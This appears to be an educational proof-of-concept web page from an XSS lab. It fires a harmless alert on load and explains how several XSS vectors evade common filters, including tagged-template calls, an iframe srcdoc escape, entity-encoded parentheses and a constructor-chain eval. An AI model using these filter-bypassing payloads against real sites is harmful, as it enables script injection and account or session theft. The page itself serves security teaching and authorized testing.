@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Advanced XSS PoC · x8bitranjit</title>
+<meta name="description" content="Benign advanced XSS demonstration — fires alert('Hello from x8bitranjit') on view.">
+<style>
+  :root{ --bg:#0b0f14; --panel:#111823; --border:#243040; --text:#e6edf3; --muted:#8b949e; --accent:#7ee787; --accent2:#58a6ff; --warn:#f0883e; }
+  *{ box-sizing:border-box; }
+  body{ margin:0; background:radial-gradient(1200px 600px at 50% -10%, #16202e 0%, var(--bg) 60%); color:var(--text);
+        font:16px/1.65 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; min-height:100vh; }
+  .wrap{ max-width:780px; margin:0 auto; padding:56px 20px 48px; }
+  .mono{ font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
+  a.back{ color:var(--muted); text-decoration:none; font-size:.85rem; }
+  a.back:hover{ color:var(--accent2); }
+  h1{ font-size:1.7rem; margin:14px 0 6px; }
+  h1 .tag{ color:var(--accent); }
+  .sub{ color:var(--muted); margin:0 0 28px; font-size:.92rem; }
+  h2{ font-size:1.05rem; margin:30px 0 10px; color:var(--accent2); }
+  p{ color:#cdd6e0; }
+  pre{ background:#0d1622; border:1px solid var(--border); border-radius:10px; padding:14px 16px; overflow-x:auto;
+       font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.86rem; color:#e6edf3; }
+  code{ font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
+  .fired{ display:inline-block; margin:6px 0 0; padding:3px 10px; border-radius:999px; border:1px solid var(--border);
+          color:var(--accent); font-size:.78rem; }
+  table{ border-collapse:collapse; width:100%; margin:8px 0; font-size:.85rem; }
+  td,th{ border:1px solid var(--border); padding:8px 10px; text-align:left; vertical-align:top; }
+  th{ color:var(--muted); font-weight:600; }
+  .note{ margin-top:30px; padding:14px 16px; border-left:3px solid var(--warn); background:#1a1410; border-radius:0 10px 10px 0;
+         color:var(--muted); font-size:.85rem; }
+  footer{ margin-top:36px; padding-top:18px; border-top:1px solid var(--border); color:var(--muted); font-size:.82rem; }
+  .accent{ color:var(--accent); }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <a class="back mono" href="./index.html">&larr; back to the lab</a>
+    <h1 class="mono">Advanced XSS — <span class="tag">fires on view</span></h1>
+    <p class="sub">The only effect of this page is a benign <code>alert('Hello from x8bitranjit')</code>. Below is the exact vector and why it defeats common filters.</p>
+
+    <!-- The ONLY executing sink on this page. Everything else is escaped, inert text. -->
+    <div id="sink" style="display:none"></div>
+    <span class="fired mono" id="status">payload armed…</span>
+
+    <h2>The vector it just fired</h2>
+    <pre>&lt;img src=x onerror=alert`Hello from x8bitranjit`&gt;</pre>
+    <p>Injected via <code>element.innerHTML</code>. Two expert details make it land where a naive payload wouldn't:</p>
+    <table>
+      <tr><th>Technique</th><th>Why it beats the filter</th></tr>
+      <tr><td><code>&lt;img onerror&gt;</code> (not <code>&lt;script&gt;</code>)</td>
+          <td><code>&lt;script&gt;</code> inserted through <code>innerHTML</code> <em>never executes</em>. A broken <code>&lt;img&gt;</code> does — its <code>onerror</code> fires during parsing. This is the canonical <code>innerHTML</code>-executable primitive.</td></tr>
+      <tr><td>tagged template <code>alert`…`</code></td>
+          <td>An ES6 <em>tagged-template call</em> invokes the function with no <code>()</code> — it slips past blocklists keyed on <code>alert(</code> or on parentheses entirely.</td></tr>
+      <tr><td>no quotes needed on <code>src=x</code></td>
+          <td>Unquoted attribute value avoids <code>"</code>/<code>'</code> filters; <code>x</code> is an invalid URL so the load fails instantly and deterministically.</td></tr>
+    </table>
+
+    <h2>Expert variants (same benign payload, different sink/filter)</h2>
+    <pre>&lt;svg/onload=alert('Hello from x8bitranjit')&gt;                      &lt;!-- direct DOM insert / SVG context --&gt;
+&lt;details open ontoggle=alert('Hello from x8bitranjit')&gt;             &lt;!-- no img/svg needed --&gt;
+&lt;marquee onstart=alert('Hello from x8bitranjit')&gt;                  &lt;!-- legacy handler, still fires --&gt;
+&lt;iframe srcdoc="&amp;lt;img src=x onerror=alert('Hello from x8bitranjit')&amp;gt;"&gt;   &lt;!-- nested-document escape --&gt;
+&lt;img src onerror=alert&amp;#40;'Hello from x8bitranjit'&amp;#41;&gt;            &lt;!-- HTML-entity-encoded parens --&gt;
+[]["constructor"]["constructor"]("alert('Hello from x8bitranjit')")()  &lt;!-- eval-less, no literal 'alert(' in source --&gt;</pre>
+
+    <div class="note">
+      <strong>Benign &amp; self-contained.</strong> This page accepts no user input, reflects nothing from the URL, and reaches no other
+      origin — so it cannot be repurposed as an open reflector. It exists to demonstrate the vectors, for education and
+      <strong>authorized</strong> testing only.
+    </div>
+
+    <footer class="mono">x8bitranjit · <a class="accent" href="./index.html" style="text-decoration:none">XSS PoC Lab</a></footer>
+  </div>
+
+  <script>
+    // Advanced, BENIGN proof of concept. The sole effect is a self-referential alert.
+    document.addEventListener('DOMContentLoaded', function () {
+      // <img onerror> is the innerHTML-executable primitive; alert`...` is a tagged-template call (no parentheses).
+      document.getElementById('sink').innerHTML = "<img src=x onerror=alert`Hello from x8bitranjit`>";
+      var s = document.getElementById('status');
+      if (s) { s.textContent = "payload fired ✓"; }
+    });
+  </script>
+</body>
+</html>
